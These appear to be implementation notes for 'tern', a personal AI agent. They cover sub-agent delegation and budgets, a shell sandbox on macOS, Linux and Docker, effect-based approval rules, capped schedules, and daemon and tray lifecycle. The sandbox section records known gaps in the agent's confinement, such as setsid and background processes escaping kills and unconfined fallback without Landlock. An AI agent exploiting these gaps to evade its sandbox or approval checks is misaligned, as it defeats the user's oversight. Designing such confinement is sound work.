- **Tool scope** is frozen on the run as a JSON list. `"read_only"` is the fixed list of built-in read tools; MCP and connector tools aren't included (their policy depends on arguments). `schedule_create`, `schedule_delete` and `connector_activate` are always removed; `agent_*` are added only below `max_depth`. An out-of-scope call is journaled as an error result without approval.
- **Cancellation**: a child's error records why: `cancelled by the user` (API), `cancelled by the parent agent[: reason]` (`agent_cancel`), `cancelled: the parent run ended` (any end of the parent: children can't outlive its run). The status is written at once as well as when the child's drive ends, so a process that exits first (Ctrl+C in `tern run`) doesn't leave it resumable. Only interrupted runs whose error starts with `cancelled` are treated as stopped on purpose (`subagent::was_cancelled`).
- **Events**: `subagent_spawned` is sent before the child starts, so its `run_started` (which carries `parent_run_id`) always comes after. Child runs emit their usual events under their own run id. `agent_wait` sends `<label> <status>` lines as `tool_output`; the blocking inbox step sends none (it isn't a tool call, so there is no id to attach them to).
- **Activity** in `agent_wait`/`agent_status` comes from the child's newest journal step (`Running list_dir`, `Waiting for approval`, …), not from events, so it works for a child driven by another process.
- **`runs_parent_label`**: a unique index on `(parent_run_id, label)` backs the label check, besides the design's `(parent_run_id, parent_call_id)`.
- **Mock provider**: `conversations[].matches` already chose a script by the first user message, which for a child is its brief; `when_task_contains` is accepted as an alias for it.
- **`tern runs list` hides sub-agents** (with a count per parent) and `runs show` prints each child under the `agent_spawn` step that started it, plus `inbox` steps; this was listed for S2 in §3.2 but is cheap with the S1 tree.
- **`tern doctor`** has a Sub-agents section: off, or on with its limits; every model named in `[subagents]` must parse and use a configured provider.
- **Not in S1**: the TUI still applies every event to its transcript, so with sub-agents enabled in the embedded TUI a child's text interleaves with the parent's until S2 filters by run id. API endpoints, approval labels and SSE enrichment are S2; `agent_send`/`agent_ask_parent` S3.

## S2–S3

Sub-agents in the API and the TUI (S2) and two-way messaging (S3), from `docs/subagents-design.md` §7.

- **`ChildRun` is a core type** (`tern_core::subagent::ChildRun`), so `GET /v1/runs/{id}/children`, `GET /v1/sessions/{id}/subagents` and the TUI's `Backend::children` share it. `subagents::child_run` builds it from the store alone (finished mail, run row, journal), so the endpoints work with `[subagents]` disabled. Status: the finished mail's status when there is one, else `queued`/`running`/`question`, `cancelled` for an on-purpose interruption, `interrupted` for a crash. `started_at`/`finished_at` are Unix seconds, as the desktop expects, unlike the milliseconds elsewhere in the API.
- **SSE enrichment** caches a `RunPlace` (session, and for children the parent and the root run's session) per connection, like the session lookup before it. `run_started` already had `parent_run_id`; enrichment never overwrites a field the event has.
- **Session filtering is in the store**: `list_sessions` excludes `source = 'subagent'`; `list_sessions_from(limit, Some(source))` filters by source (so `?source=` works for every source, as gui-spec §7.1 wanted). `tern sessions` and the TUI's `/sessions` hide children too. `session_tree_usage` sums a session's runs and their descendants with a recursive CTE.
- **`root_session_id` on approvals** is computed by the `Router`, which already walked to the root run for delivery. Only set for sub-agents.
- **TUI**: events are filtered by run id: the running run's apply as before; a known child's update its `Entry::Agent` line; anything else is ignored (before, an attached TUI applied every run's events). `agent_*` calls get no tool line. Approvals queue (children ask concurrently) and Ctrl+C during a run denies all of them. `/agent <label>` opens an `Overlay` with the child session's history; it closes when an approval arrives, since the prompt is drawn in the transcript.
- **`tern run`** prints `[label] started|queued`, `[label] ✓ <summary>` per finished tool call, `[label] asks: …`, `[label] ← …` and `[label] <status>`; the parent's own progress is unchanged. Tool calls are keyed by run and call id: the mock provider's call ids repeat across runs.
- **Questions** (`agent_ask_parent`) are `question` mail keyed `ask:<child>:<call id>`, so re-executing the step after a crash doesn't ask again; the id the parent sees is `q_<mail id>`. A question is pending while the child's newest step is that started call and no `answer` mail for it waits (derived from the store, so it works across processes). The child consumes the answer in its tool step's transaction. The timeout runs from the question's `created_at`.
- **`agent_send`** to a child blocked on a question is the answer, with or without `question_id` (a mismatched one is an error): a blocked child can't read anything else. Otherwise it is `message` mail, delivered by the child's next inbox step, or a late `answer` if it names a question that timed out. Keyed `send:<parent>:<call id>`. It consumes the question mail if the parent hadn't received it yet.
- **`agent_wait` returns early when an awaited child is asking**, with `status: "question"`, `question_id`, `question` and `recommendation`, and consumes that question mail; it reports the same question again while it stays unanswered, so a parent can't wait out a blocked child by accident.
- **User messages** (`POST /v1/runs/{id}/message`) are `message` mail from no run, keyed `user:<run>:<uuid>`; 404 for an unknown run, 400 for a top-level or finished run, empty text, or sub-agents disabled. They emit no `subagent_message` event (its `run_id` is the sender, and the user isn't one).
- **`agent_ask_parent` is a child-only tool**: `tool::in_scope(None, …)` excludes `CHILD_ONLY_TOOLS`, and `scope_for` always adds it to a child's frozen scope (even `read_only`). `agent_send` joins `AGENT_TOOLS`. Adding tools changes the tool list in model requests, so a top-level run started before this change with `[subagents]` enabled replays with a different request digest.
- **Health** advertises `subagents` unconditionally: it says the endpoints exist, not that delegation is on.
- **Not done**: the Rust fixture writer for `tern_client` (gui-spec §6.4) doesn't exist yet, so no fixtures were added.

## S4–S5

The desktop app's view of sub-agents (S4) and the prompt that makes tern delegate (S5), from `docs/subagents-design.md` §4 and §6.

- **One agents card per fan-out** (`AgentsItem` in `apps/desktop/lib/state/transcript.dart`): consecutive `agent_spawn` calls join the last card, notes aside, as tool calls join a `WorkItem`. `agent_spawn`, `agent_wait`, `agent_send`, `agent_cancel` and `agent_status` never become tool steps. A child's status comes from, in order: `subagent_spawned`, its own `run_started`/`run_finished` (the store maps child run → parent run), `subagent_message` questions, and the JSON results of `agent_spawn`/`agent_wait`/`agent_status`, so a card rebuilt from history is right even before `GET /v1/sessions/{id}/subagents` fills in session ids and models.
- **A child's transcript** is the ordinary reducer on its own session, fed by its events through `_runSession`; the card shows it inline when a row is opened (loading the child session on first open after a reload).
- **Approvals route by `root_session_id`**, and `approval` answers follow them there; a child's run ending expires its cards in the root conversation.
- **The activity line** says "Waiting on N agents · M done" while the run is between model calls with children out; an unanswered approval still hides it.
- **The prompt is built per role** (`AgentRole::Main` / `Subagent { label }` in `tern_core::prompt`), by `runtime::PromptMaker`, which the sub-agent host gets late-bound (`Subagents::set_prompt`), so a child's frozen prompt has the "You are a sub-agent" section instead of its parent's. The "Sub-agents" section goes to runs that get the `agent_*` tools (depth < `max_depth`), after Secrets and before Skills; model aliases are listed as `` `alias` (provider:model) ``. With `[subagents] enabled = false` the prompt is unchanged from before S0.
- **`[subagents].enabled` now defaults to true.** Runs started before the upgrade keep their frozen prompt; one interrupted by the upgrade replays with a different tool list (see S2–S3).
- **Tightened for eagerness (2026-11-03)**: the Sub-agents section now says to fan out first on a multi-part request, "when in doubt, delegate", to spawn a read-only reviewer before reporting a substantial change, and lists the per-child step and token limits (`SubagentPrompt` carries `max_iterations` and `budget_tokens`) so the parent raises them instead of doing the work itself. `persona.md` gains a line on finishing the whole task and taking reversible steps without asking.
- **Limits end with a closing turn (2026-11-03)**: sub-agents were hitting their budget mid-task, so their "report" was the preamble before their last tool call, and the parent's retry with a larger budget was silently cut back to the same 400k.
  - **Closing turn**: once a run reaches `max_iterations`, or its next call would cross `budget_tokens` (used so far + the last call's input, so it lands near the budget rather than a context past it), the next model call is made with `ChatRequest::forbid_tool_calls` (tools still offered, since requests with tool history must; `tool_choice: none` on Anthropic and OpenAI-compatible) and a user note after the tool results (`WRAP_UP_MESSAGE`). Its text plus the `[stopped: …]` note is the final text. The note isn't journaled as a message: it's derived from journaled usage and iterations, so replay builds the same request. A call made anyway is left unanswered (`close_dangling_tool_uses` covers it). A run that already gave its answer while waiting on children gets no closing turn. Cron runs keep failing on `tokens_per_run`.
  - **`budget_tokens` and `max_iterations` are defaults, not caps**: `agent_spawn` may ask for more, up to `budget_tokens_ceiling` (2M; 0 = none) and `max_iterations_ceiling` (100). A lowered ask is named in the spawn result's `note`, which also carries the limits given.
  - **The child is told its limits** in a line after its brief, including that every call counts its whole input again.
- **Not done**: the real-provider eval set from §7 (fan-out, a quick lookup that must not delegate, review-my-work). The prompt's eagerness is asserted by string checks only.

## Shell sandbox

OS-level confinement for the host backend, Docker hardening, and process-group kills, from `docs/sandbox-design.md`.

- **macOS: Seatbelt via `/usr/bin/sandbox-exec -p <profile>`**, generated per command. `(allow default)` then deny-and-reallow: all writes denied except the workspace, `/tmp`, `/var/tmp`, `$TMPDIR`, `write_paths` and a few `/dev` nodes; reads (`file-read*`) denied under `$HOME` except the workspace, `read_paths`, `write_paths` and `PATH` entries, with `file-read-metadata` on their ancestors so path lookups work. Reads outside home stay open: a `(deny default)` profile breaks too much of macOS for too little gain. `sandbox-exec` is deprecated but is what Chromium, Codex and Claude Code still ship on. Paths are embedded as escaped string literals, not `-D` params.
- **macOS extras**: signals only to `(target same-sandbox)` (so a command can't kill the daemon), and `mach-lookup` of `com.apple.SecurityServer`/`securityd.xpc`/`security.agent` denied, because Keychain reads go through `securityd` and would bypass file rules. Setuid binaries (`ps`) can't exec under Seatbelt; accepted.
- **Linux: a re-exec helper, not `pre_exec`.** The workspace forbids `unsafe`, and `CommandExt::pre_exec` is unsafe (and allocating between fork and exec in a multithreaded daemon isn't sound anyway). So the backend runs `<tern> __sandbox-exec [--require] [--no-network] --read P… --write P… -- sh -c <cmd>`; `main` checks for that argument before clap, the helper applies Landlock (the `landlock` crate, targeting ABI 6, best effort) and seccomp (`seccompiler`), then `exec`s. Same pid, so process-group kills still work. The helper path is `current_exe()` unless `HostPolicy::helper` says otherwise (tests point it at `CARGO_BIN_EXE_tern`).
- **Linux grants are an allowlist** (Landlock can't carve exceptions out of a grant): read on `/usr /bin /sbin /lib* /etc /opt /proc /sys /dev /run /nix /snap`, `read_paths` and `PATH` entries; full access on the workspace, `/tmp`, `/var/tmp`, `/dev/{null,zero,full,tty,ptmx,pts,shm}` and `write_paths`; device ioctls under `/dev`. `/var` and `/home` aren't granted. A grant that contains a denied path (tern's data dir) is dropped with a warning rather than letting the data dir through.
- **Network off on Linux** is seccomp `EACCES` on `socket(AF_INET|AF_INET6)` and `io_uring_setup` (plus the x32 numbers on x86_64), and Landlock's TCP rights when the kernel has ABI 4. Unix sockets keep working, as on macOS. Landlock alone would leave UDP open.
- **`confine = "auto"` is the default**: run unconfined on a kernel without Landlock, `tracing::warn!` once per backend, and a `doctor` warning; `"required"` turns the same case into `SandboxError::Unconfined` (and a `doctor` failure). The Linux probe is `<helper> __sandbox-exec --probe`, run once per backend (lazily), which reports the highest ABI a throwaway `HardRequirement` ruleset accepts. A partially enforced ruleset (old kernel) counts as confined.
- **Default `read_paths = ["~/.gitconfig", "~/.config/git"]`**: git dies on `EACCES`/`EPERM` reading its global config, and both are config, not credentials. `PATH` entries are granted read automatically (not `$HOME` itself, `/`, or relative entries) so `~/.cargo/bin` and friends resolve; whatever else a toolchain reads is the user's to add. `HOME` stays the real home, so caches like `~/.npm` fail to write until listed in `write_paths`.
- **Process groups**: every command (both backends) gets `process_group(0)`; timeout and cancel `killpg(SIGKILL)` it via `nix` before killing the child. Background processes are still left alone after a normal exit (`cmd &` for a dev server is a real use), and `setsid` escapes; both documented.
- **Docker**: `--cap-drop ALL --security-opt no-new-privileges` always; `--memory 2g --cpus 2 --pids-limit 512` by default (`docker_memory = ""`/`docker_cpus = 0`/`docker_pids = 0` drop each); `--network none` when `sandbox.network = false`. The container's settings are fingerprinted (FNV-1a of image + flags) into a `tern.sandbox.config` label, replacing the old image comparison, so any settings change recreates it. `DockerBackend::new` now takes `DockerSettings`.
- **`HostBackend` is no longer a unit struct**: `HostBackend::new(HostPolicy)`, `::default()` (confined, network on) and `::unconfined()`. The runtime builds the policy from `[sandbox]` and always denies `$TERN_HOME`.
- **Not verified here**: the Linux path was cross-checked with clippy (musl via zig) but not run; CI's ubuntu job runs `crates/tern/tests/sandbox.rs`, whose tests skip themselves if the runner kernel has no Landlock.

## T0 (tool effects)

Every tool declares an effect, and the host decides from it when to ask (docs/personal-agent-tooling-spec.md §5.1, §6.3).

- **Model.** `tern_core::tool::Effect` is `read`, `write` or `destructive` (`write` is the `Default`). `Tool::effect()` is required, so a new tool can't forget it, and is what tool lists show. `Tool::untrusted()` (default false) marks tools that return third-party text; it is recorded and listed only, since tainting runs is T3. `ToolPolicy` (per call) gained `effect`, `granted` and `forbidden`; `ToolPolicy::new(effect, idempotent)`, `granted_write(idempotent)` and `.forced(requires_approval)` build it.
- **Policy is one function**, `approval::check(tool, policy, granted) -> Allow | Ask { effect, always } | Forbid(flag)`, where `granted` means an allowlist ("always") entry covers the call:
  - `read` doesn't ask;
  - `write` asks unless an allowlist entry or the host's own grant (`ToolPolicy::granted`) covers it;
  - `destructive` asks every time, ignores allowlist entries, and never offers "always";
  - `requires_approval` asks for any effect (allowlist entries still apply) and overrides the host's own grant;
  - a `forbidden` tool (`money_movement` / `trade`) is refused without asking, whatever its effect, old allowlist entries, or `--yes`. The model gets a "blocked … nobody can approve" error. It is journaled as a `denied` approval step.
- **Host-granted writes keep today's behaviour.** The spec's table makes `write_file` a `write`. Making every workspace write, memory save or schedule ask would have been a big regression, so writes to the workspace and to tern's own state are `write` with `granted = true`: the host holds a standing grant, in the same place a user's "always" would sit. Outside the workspace `requires_approval` still forces a prompt.
- **`shell` is the one tool whose allowlist decides its effect.** It is `destructive` and forced, but `check` treats a command covered by the allowlist (`git *`) as a granted `write`. So "shell outside the allowlist counts as destructive" holds: such a command asks, and the prompt still offers "Always (git *)", because that is how commands get into the allowlist. Wrapper commands (`bash`, `env`, …) still get no "always".
- **Approval steps are only journaled when a prompt is possible** (`approval::needs_check`), i.e. exactly as before for built-ins. `read` tools and host-granted writes skip the step.
- **Effects of the built-in tools:**

  | Tool | Effect | Notes |
  |---|---|---|
  | `read_file`, `list_dir`, `search_files` | read | forced outside the workspace, as before |
  | `write_file`, `edit_file` | write | host-granted inside the workspace; forced outside |
  | `shell` | destructive | a granted write when the allowlist covers the command |
  | `http_fetch` | read, **untrusted** | GET only |
  | `memory_save` | write | host-granted (tern's own state) |
  | `memory_search`, `session_search`, `skill_read`, `schedule_list` | read | |
  | `schedule_create`, `schedule_delete` | write | host-granted. Deleting a schedule is tern's own state, so not `destructive`, which would ask every time |
  | `agent_spawn`, `agent_cancel`, `agent_send`, `agent_ask_parent` | write | host-granted: a child's own calls go through the same policy |
  | `agent_wait`, `agent_status` | read | |
  | `secret_request` | write | host-granted: the user is the gate (they type the values or skip) |
  | `connector_write` | write | host-granted (drafts directory only) |
  | `connector_test` | the tested tool's effect | asks (forced) when the draft reaches the network or secrets, as in M4. A `destructive` draft tool then asks every time, and a `money_movement` one is refused. Offline drafts are host-granted |
  | `connector_activate` | write | forced, never "always", as in M4 |

- **Approval requests carry `effect`** (`ApprovalRequest::effect`, the effect after the shell rule) and `headline()` = `"<effect> · <summary>"`, which the TUI, Telegram, `tern run` and the desktop card show. `ApiApproval.effect` is `#[serde(default)]` (`write`) so a newer client can read an older daemon. `GET /v1/tools` returns `ApiTool` = the spec flattened plus `effect` and `untrusted`. `/v1/info`'s `(name, description)` pairs are unchanged, so the desktop shows effects in the tool dialog (from `/v1/tools`), not in the side-panel list.

### Luau

- **Fields**: `effect = "read" | "write" | "destructive"` (anything else is a load error), `untrusted = true`, `read_via_post = true` (only valid with `effect = "read"`), `money_movement = true`, `trade = true`. A missing `effect` is `write`; `ToolDef::declared_effect` keeps the `Option` so grandfathering can tell.
- **"Read tool uses a non-GET method" is enforced when the request is made, not at load.** A connector's methods live inside its `run` functions, so a static check would be guesswork. Instead `ctx.http` (both `request{method=…}` and the shorthands) refuses anything but GET/HEAD for a `read` tool without `read_via_post`, before sending, with an error naming both fixes. `connector_test` surfaces it on the first try.
- **Grandfathering (§13 decision 4).** Before T0 a tool without `requires_approval` never asked. The first time `Connectors::open` runs against a data directory after the upgrade (`grandfather_existing`, guarded by kv `lua:meta/effects_snapshot`), it records each connector already in `~/.tern/connectors/` by source hash in kv `lua:grandfathered`. For a recorded connector whose file still has that hash, tools with no declared `effect` get M4's behaviour (a host-granted `write`: no prompt unless `requires_approval`). Declared effects and money flags apply regardless. Grandfathering ends when:
  - the file changes (its hash no longer matches);
  - the connector is activated again (`record_approval` deletes the entry), even with identical source.

  Connectors added after the snapshot never get it. A fresh install snapshots an empty (or user-prepared) directory, which is harmless. `tern connectors list` reads the real database if it exists and marks grandfathered connectors; it never creates one.
- `capability_summary()` (the activation prompt) now lists tools as `name (effect)`, and `connector_write`'s result shows `[effect]` per tool. The connector docs given to the model describe the new fields.

### MCP

- **Hints**: `readOnlyHint: true` → `read`; else `destructiveHint: true` → `destructive`; else `write`. MCP defaults `destructiveHint` to true when absent, but tern only trusts what a server states, so an unannotated tool is `write` (spec §5.1). `openWorldHint` isn't mapped to `untrusted` yet (MCP defaults it to true, which would mark every tool); MCP tools list as not untrusted until T3 decides.
- **Override key**: `[mcp.servers.<name>] effects = { <server tool name> = "read" | "write" | "destructive", "*" = … }`. The key is the server's own tool name (not the `mcp__…` exposed name), and `"*"` covers the rest. An exact name wins over `"*"`, and both win over hints. An invalid value fails config parsing. `requires_approval` and `idempotent` stay per server. This is the "per-tool approval overrides" item mcp-management-spec §8 lists for later, kept to one map so the MCP form can add a per-tool picker on top of it.
- The Python fixture now annotates `echo` (read-only), `fail` (destructive) and `crash` (`destructiveHint: false`).

## T1a (quiet, capped schedules)

Stage 1 of docs/personal-agent-tooling-spec.md on today's schedules (§4.1 `NO_REPLY` and quiet hours, §8.3 budgets). Routines, watches, gates, initiative levels and digests stay T1b.

- **`NO_REPLY` is decided in the agent, from the journaled final answer.** A completed run with trigger `cron` and no parent whose final text trims to exactly `NO_REPLY` sets `runs.quiet` (migration 7) and `RunOutcome::quiet`, and `run_finished` carries `quiet: true` (omitted when false, so older clients are unaffected). A resumed run replays to the same text, so it decides the same. The daemon then delivers nothing, and the desktop skips its notification. The same answer in a chat is ordinary text.
- **Scheduled runs get their own prompt role** (`AgentRole::Scheduled`, chosen by `trigger = "cron"` in `Runtime::start_run`): a short section saying nobody is watching, when to answer `NO_REPLY`, and not to ask questions. It's in the system prompt, not appended to the schedule's text, so the transcript shows what the user wrote.
- **Quiet hours hold the delivery, not the run.** `[schedules] quiet_hours` (default `22:00-07:30`, `none` to turn off; `QuietHours` in `tern-core/src/quiet.rs`, may cross midnight; a start equal to its end is never quiet) and per schedule `quiet_hours` (`NULL` = the default). A result finishing inside the window goes into `held_deliveries` with `release_at` = the window's end, computed when it is held. Each scheduler tick sends due rows, one combined message per target ("N updates from quiet hours:", each under `▸ <first prompt line>`), and deletes them only after the gateway accepts it, so a restart or a failed send retries. `urgent` bypasses the window. Pause notices go through the same path.
- **Quiet hours apply to deliveries, not desktop notifications.** The desktop notifies on `run_finished` when the window isn't focused; holding that would need a held-notification event, and the OS already has Focus modes. Revisit with T2 channels.
- **Caps** (`runs_per_day`, `usd_per_day`, `tokens_per_run`): per schedule (`NULL` = the `[schedules]` default), set through `schedule_create` / `schedule_update`, the API and the app; `null` in an update puts the default back.
  - **Daily caps are checked when a run is due**, not after a run. So a daily schedule with `runs_per_day = 1` never pauses, and the notice only comes when a run is actually skipped. The schedule's `next_run_at` advances as usual; `paused_until` (next local midnight) and `paused_reason` are set by a conditional update that only succeeds when not already paused, which is what makes the notice exactly-once. Later due slots that day are skipped silently.
  - **Resuming** (`resume: true`, or re-enabling) clears the pause and sets `budget_since = now`: the day's count restarts from there, so the cap doesn't pause it again at once. "Run now" isn't capped (the user asked for it) but counts.
  - **Counting**: runs are top-level `cron` runs in the schedule's session since `max(local midnight, budget_since)`. Spend sums journaled usage per model over those runs *and their sub-agents* (a recursive CTE over `parent_run_id`).
  - **Prices**: `[providers.<name>.prices]` first (USD per million tokens; cache prices default to the input price), then the cached model list. `ModelInfo` gained `pricing`, parsed from OpenRouter-style `pricing.prompt` / `completion` / `input_cache_read` / `input_cache_write` (USD per token, strings). Anthropic's and OpenAI's model lists carry no prices, so the config key is how those get a USD cap. If any model the schedule used today, or will use next, has no price, the USD cap is ignored: logged once per schedule and model per daemon run, and listed by `tern doctor`.
  - **`tokens_per_run` reuses the run's `budget_tokens`** (the sub-agents' budget column), set by `Manager::start_scheduled` before the run is driven. For a `cron` run, reaching it fails the run with `stopped: this run used N tokens, over its cap of M (tokens_per_run)`; sub-agents keep their "[stopped: token budget]" note so a parent still gets what they found. Checked where sub-agent budgets are, after each model turn's tool calls, from journaled usage, so replay stops at the same point. A final answer that crosses the cap still completes.
- **`schedule_update` is new** (the API's PATCH already existed). Both share `tern_tools::schedule::update_schedule` and `ScheduleLimits`, which validates quiet hours and caps (`> 0`). It is host-granted like `schedule_create` and excluded from sub-agents.
- **API**: `GET /v1/schedules` adds `last_quiet`, `quiet_hours`, `urgent`, the three caps, and `paused` (`"budget"`), `paused_until`, `paused_reason` while a pause is in force (`enabled` stays true). `tern_client`'s `Schedule` gains them (as `ScheduleLimits`), with `test/fixtures/schedule.json` checked against the Rust type by `api_schedules::tests::dart_fixture_matches_the_api`.
- **TUI**: it has no schedule list of its own; schedules appear there through `schedule_list`, whose lines now show `paused: budget (…) until …`, quiet hours, urgency and caps. A `/routines` view is T1b's (spec §12.2).
- **Tests** (`crates/tern/tests/t1a.rs`): fast-forward by editing `next_run_at` and `held_deliveries.release_at` in the database, as M5's tests do, and pick a quiet window around the current local time, so no clock injection was needed.

## T8a (start and stop without a terminal)

Stage 1 of the menu-bar design (docs/personal-agent-tooling-spec.md §11.5, §11.5a, §11.7): everything but the tray process, which is T8b.

- **`GET /v1/status`** (`daemon/api_lifecycle.rs`): `version`, `pid`, `uptime_secs`, `managed_by` (`launchd`/`systemd` from the `TERN_SERVICE` variable the service sets, else null), `running_runs` (top-level runs; sub-agents count with their parent), `pending_approvals` (approvals plus secret requests waiting for an API client), `active_schedules` (enabled and due again) and `gateways: [{name, ok}]`, where `ok` means the gateway's polling task hasn't ended. No initiative level until T1b. Any scope may read it.
- **`POST /v1/shutdown`** cancels a token that `daemon::serve` selects on beside SIGINT/SIGTERM, so it takes the same exit path: runs stay `running` and resume on the next start (M5), and the process exits 0. `?dry_run=1` returns the same `{stopping, runs: [{run_id, session_id, title}]}` without stopping, for the confirmation. `title` is the session's title, else the first line of the run's input message, cut to 60 characters. It's in `auth::OWNER_ONLY` (both forms are POSTs), so over TCP only an `owner` device may call it; the spec's "admin" scope is D1's `owner`.
- **The PID file already existed** (`~/.tern/tern.pid`, written under the M5 lock). `tern stop` and `service status` decide "running" by trying the lock, not by the pid's liveness, so a stale file never makes a reused pid look like tern.
- **`tern stop`**: `POST /v1/shutdown`, wait 10 s for the lock to go; then, if the service manager has tern loaded, `launchctl bootout` / `systemctl --user stop` (and 5 s); then SIGTERM, 5 s, SIGKILL. Before signalling, `ps -o uid=,comm=` must show a process of this uid whose command name starts with `tern`. An old plist with `KeepAlive = true` (no `SuccessfulExit` key) would restart even a clean exit, so for that one `stop` boots the job out *before* asking. The plist and unit file stay, so the next login still starts tern.
- **`tern start`**: through the service when its file exists (`launchctl bootstrap` if not loaded, then `kickstart`; `systemctl --user start`), else `tern daemon` detached in its own process group with output appended to `logs/daemon.log`. Waits up to 15 s for `/v1/health`.
- **`tern service install [--no-login] | uninstall | status`** writes `~/Library/LaunchAgents/ai.tern.daemon.plist` (`KeepAlive = { SuccessfulExit = false }`, `RunAtLoad` unless `--no-login`, stdout/stderr to `~/.tern/logs/daemon.{out,err}.log`) or `~/.config/systemd/user/tern-daemon.service` (`Restart=on-failure`, `TimeoutStopSec=15`, `enable` unless `--no-login`). Both run the canonical path of the current binary with `TERN_HOME`, `TERN_SERVICE` and the installing shell's `PATH` (launchd's default `PATH` would hide tools the agent's shell needs).
  - **Install and uninstall never stop a running tern.** Unticking "start at login" shouldn't turn it off: a running launchd job is left loaded (launchd forgets it at logout), a loaded idle one is booted out. `tern stop` is the only way to stop.
  - **A service-started daemon that finds the lock taken exits 0**, not with an error. Otherwise installing the service while an app-started daemon runs would put launchd/systemd into a restart loop against the lock.
  - `TERN_LAUNCHCTL` / `TERN_SYSTEMCTL` replace the service manager's command. The tests point them at a script that records its arguments, so no test touches the real launchd or systemd.
- **`tern doctor`** reports "managed by: …" (installed, at login or not, running) under Daemon.
- **Test switches**: `TERN_TEST_IGNORE_SHUTDOWN` makes the daemon answer `/v1/shutdown` without stopping and hold SIGTERM/SIGINT (only SIGKILL works), like a wedged daemon; `TERN_TEST_STOP_WAIT_MS` shortens both of `tern stop`'s waits. `tests/t8a.rs` checks that escalation leaves no process.
- **Desktop app**:
  - **tern › Quit tern completely** (⌥⌘Q; Ctrl+Alt+Q off macOS) beside the normal Quit. It calls the dry run; if runs are in progress it asks "Quit tern?" with the §11.5a wording, naming them; with nothing running it doesn't ask. Then `/v1/shutdown`, a "Quitting tern…" dialog while it waits up to 10 s for `/v1/health` to stop answering, then `tern stop` (the escalation) if it didn't, then the app exits. With a remote core it only quits the app.
  - **Settings…** (new, in the tern menu; ⌘, stays on Models) has a General section: **Start tern when I log in** runs the bundled or `PATH` `tern service install|uninstall` and reads its state from the plist (`RunAtLoad` true) or the systemd `default.target.wants` link; **When I close the window: keep tern running in the background (recommended) / quit tern completely**. The window's close (and ⌘Q) goes through `AppLifecycleListener.onExitRequested`, which runs the Quit flow when the second option is chosen and can cancel the exit.
  - **App preferences** live in `~/Library/Application Support/tern/desktop.json` (`$XDG_CONFIG_HOME/tern/desktop.json` elsewhere), not in `~/.tern`, which is the engine's. No `shared_preferences` dependency for one key.
  - "tern isn't running" keeps **Start tern**, which now runs `tern start` (so it goes through the service when installed). UI copy no longer says "daemon" (also two older strings in the conversation and routine views).
- **Later**: `SMAppService` registration from the app bundle (§11.5; needs Xcode, which this machine lacks), so tern shows up in System Settings › Login Items by name; until then the app installs the plain LaunchAgent through `tern service`. Also later: the first-close notification, **Remove tern from this Mac…**, `PUT /v1/initiative` and `GET /v1/clients` (T8b with the tray), and **Send a report** after a forced stop.

## T8b (the menu-bar tray on macOS)

Stage 3 of the menu-bar design (docs/personal-agent-tooling-spec.md §11.2–§11.5a), scaled to what exists today.

- **`tern tray`** (`crates/tern/src/tray/`) is a client in its own process, like the TUI: the daemon and the window never depend on it, and it supervises nothing.
  - `model.rs` is pure: daemon state (`Running(summary)`, `Unreachable`, `Starting`, `Stopping`, `Stopped`) plus context (start at login, gateway names seen) → icon, tooltip and menu items. All the menu logic is unit-tested without AppKit.
  - `worker.rs` runs on a background thread with a current-thread tokio runtime. It reads `/v1/status` over the Unix socket, then sleeps on `/v1/events` (sending `X-Tern-Client: tray/<version>` for the later `/v1/clients`) and re-reads the status 500 ms after the first event of a burst, or every 60 s. No busy loop while tern runs; while it's stopped the worker checks the PID-file lock every 2 s (lock held but no answer = ◐ "isn't answering").
  - `macos.rs` owns the main thread: `NSApplication` with the accessory activation policy, `tray-icon` + `muda` for the status item and menu, `NSAlert` for dialogs. The worker posts updates through the main dispatch queue (`dispatch2`); menu clicks go back over a channel. The menu is rebuilt only when the model changes.
  - **Actions run this same binary**: Start tern = `tern start`, Quit tern = `tern stop`, Start at login = `tern service install --tray` / `uninstall`. So Quit has exactly `tern stop`'s escalation (§11.5a) with no second copy of it. Quit first does `/v1/shutdown?dry_run=1` and asks "Quit tern?" naming the tasks only when some are running; after a successful stop it terminates the desktop app (`NSRunningApplication`, no Apple Events permission needed) and exits 0.
  - **Icons** are drawn in code as template images (36 px, tinted by macOS): ● filled, ● with a ring while a task runs, ● with a badge when approvals wait, ◐ in between, ○ stopped. No image assets.
  - **One tray per user**: `~/.tern/tray.lock` (the same `File::try_lock` as the daemon). A second one prints "already running" and exits 0, which also keeps a launchd-started duplicate from restarting.
  - **No GUI session** (`launchctl managername` isn't `Aqua`, e.g. over SSH): exits with a clear error.
- **The `tray` cargo feature** gates the AppKit side and `SMAppService`. It's **on by default**, because every dependency (`tray-icon` without default features, `objc2*`, `dispatch2`, `smappservice-rs`) is a macOS-only target dependency: Linux and musl builds compile only the stub and are unchanged. When T8c adds `ksni`, the musl builds should pass `--no-default-features`.
- **No `unsafe`**: the workspace forbids it. `objc2-app-kit` and `tray-icon` are safe to call; `objc2-service-management`'s calls are `unsafe`, so `SMAppService` goes through the small `smappservice-rs` wrapper rather than our own bindings.
- **Login items** (`service.rs`, `Method::{File, AppService}`):
  - **From the app bundle** (`tern-tray` inside `tern Tray.app` that carries the daemon plist, macOS 13+): `SMAppService.agent(plistName: "ai.tern.daemon.plist")` for the daemon and `SMAppService.mainApp` (the tray bundle itself) for the tray. They show under tern in System Settings › General › Login Items. "Needs approval" is reported and opens that pane.
  - **The daemon plist lives in the tray bundle**, with `BundleProgram = Contents/MacOS/tern-tray`, because `SMAppService` looks in the *calling* bundle's `Contents/Library/LaunchAgents`, and it's the tray bundle's binary that runs `tern service`. It's generated by the hidden `tern service bundle-plist` so the packaging script and Rust can't drift. It has nothing user-specific: no `TERN_HOME` (default `~/.tern`), no log paths (the daemon logs to `~/.tern/logs` itself) and a fixed `PATH` that includes Homebrew's.
  - **A CLI install** keeps T8a's plain plist, and `--tray` adds `~/Library/LaunchAgents/ai.tern.tray.plist` (`tern tray`, `LimitLoadToSessionType = Aqua`, `KeepAlive = { SuccessfulExit = false }`, so Quit and "Close this icon" stick). macOS 12 and builds without the feature use this path too.
  - **One method at a time**: registering through `SMAppService` removes the plain plists (booting out an idle job, never a running one); installing a plain plist from the bundle (`--no-login`) unregisters the app services. `--tray` conflicts with `--no-login`.
  - **State from outside the bundle** (a CLI on `PATH` asking about an app registration): `launchctl print`'s `path =` inside an `.app/Contents/Library/LaunchAgents/` means `SMAppService`. Whether the tray login item is on can only be asked from inside the bundle, so `tray_at_login` may be unknown.
  - **Unticking never stops tern**: unregistering an `SMAppService` agent stops it, so `uninstall` waits for it to go and starts tern again detached (runs resume, M5).
  - `tern service status --json` gives the desktop app the full state; `tern doctor`'s "managed by" line names the method ("macOS login item from tern.app (SMAppService)" or "launchd LaunchAgent … plist") and whether the icon starts at login.
